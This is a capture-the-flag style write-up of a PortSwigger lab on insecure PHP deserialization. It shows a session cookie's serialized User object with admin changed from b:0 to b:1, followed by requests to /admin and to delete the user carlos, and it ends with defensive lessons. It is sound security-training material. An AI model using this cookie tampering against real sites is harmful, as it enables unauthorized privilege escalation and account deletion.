# Lab: Modifying Serialized Objects

**Difficulty:** Apprentice

**Vulnerability:** Insecure Deserialization

**Impact:** Privilege Escalation

**Status:** Solved ✅



---



## What is Insecure Deserialization?



**Insecure deserialization** occurs when a website deserializes data that can be controlled or modified by the user.



Serialization converts an object into a format that can be stored or transmitted:



```text

Object → Serialization → Serialized Data

```



Deserialization performs the reverse operation:



```text

Serialized Data → Deserialization → Object

```



The vulnerability occurs when the application trusts serialized data supplied by the user.



In this lab, the session cookie contains a **serialized PHP object**. By modifying one of its attributes, I was able to escalate my 
privileges to administrator.



---



## Lab Scenario



The application uses a serialization-based session mechanism.



The session cookie contains a serialized `User` object with an `admin` attribute.



Initially:



```text

username = wiener

admin = false

```



The goal is to:



1. Modify the serialized object.

2. Escalate privileges.

3. Access the admin panel.

4. Delete the user `carlos`.



---



## Step 1 — Login



Login using:



```text

Username: wiener

Password: peter


```



After login, the `GET /my-account` request contains a session cookie:



```http

Cookie: session=...

```



The cookie appears to be URL and Base64 encoded.



---



## Step 2 — Inspect the Session Cookie




Using Burp Suite's **Inspector**, decode the cookie.




The decoded value is:




```text

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

```



This is a serialized PHP object.



### Breaking it down




```text

O:4:"User"

```



An object of the `User` class.



```text

s:8:"username"

```



A string attribute named `username`.



```text

s:6:"wiener"

```




The username value is `wiener`.


```text

s:5:"admin"

```



An attribute named `admin`.



```text

b:0


```



Boolean `false`.



Therefore, the object represents:



```text

User

├── username = "wiener"

└── admin = false

```



---



## Step 3 — Modify the Serialized Object



Send the request to **Burp Repeater**.



Using Burp Inspector, change:



```text

b:0

```



to:



```text


b:1

```



The serialized object becomes:



```text

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

```



Now the object represents:



```text

User

├── username = "wiener"

└── admin = true

```



Click **Apply changes** so Burp automatically re-encodes the modified object.



---



## Step 4 — Send the Modified Request



Send the request.



The response now contains a link to:



```text

/admin

```



This indicates that the server deserialized the modified object and treated the user as an administrator.





---



## Step 5 — Access the Admin Panel



Change the request path to:



```http

GET /admin

```



Send the request.



The admin panel contains links for deleting user accounts.



---



## Step 6 — Delete Carlos


Change the request path to:



```http

GET /admin/delete?username=carlos

```




Send the request.



The lab is solved.


---



## Why Did the Attack Work?



The application trusted the serialized session object.



Originally:


```text

admin = false

```




After modification:



```text

admin = true

```



The server then deserialized the modified object and used the resulting state without securely validating whether the user was actually 
allowed to have administrator privileges.





The vulnerability chain was:



```text

User-controlled session cookie

          ↓

Serialized PHP object

          ↓

Modify admin attribute
          ↓

admin = true

          ↓


Deserialization

          ↓

Privilege escalation

          ↓

Access /admin

          ↓

Delete carlos


```



---



## PHP Serialization Quick Reference




Common PHP serialization types:





```text


O = Object

s = String

b = Boolean

```



Examples:




```text

b:0;

```



means:



```text

false

```



and:



```text

b:1;

```




means:




```text

true

```



For strings:



```text

s:6:"wiener";

```



means:



```text

String

Length = 6

Value = wiener

```



---


## Important Security Lessons



### 1. Encoding is not security



The session cookie used Base64 and URL encoding.



That does **not** make the underlying data trusted or protected.





```text


Encoding ≠ Encryption

Encoding ≠ Security

```



### 2. Client-side serialized data can be dangerous


If the server stores security-sensitive state inside a client-controlled serialized object, an attacker may attempt to modify that state.



### 3. Authorization must be enforced server-side





The application should not simply trust an attacker-controlled:



```text

admin = true

```




value to determine authorization.



---



## Key Takeaway




The core vulnerability was:


> **The application deserialized a user-controllable PHP object and trusted a security-sensitive attribute inside it.**



This allowed:



```text

admin=false → admin=true

```



resulting in privilege escalation.



---



## Vulnerability Summary



| Component         | Value                    |


| ----------------- | ------------------------ |

| Vulnerability     | Insecure Deserialization |

| Format            | PHP Serialization        |


| Entry Point       | Session Cookie           |


| Modified Property | `admin`                  |

| Original Value    | `b:0`                    |

| Modified Value    | `b:1`                    |

| Impact            | Privilege Escalation     |

| Final Action      | Delete `carlos`          |



---



## References



* PortSwigger Web Security Academy — Insecure Deserialization:
  https://portswigger.net/web-security/deserialization



* PortSwigger — Modifying Serialized Objects Lab:
  https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
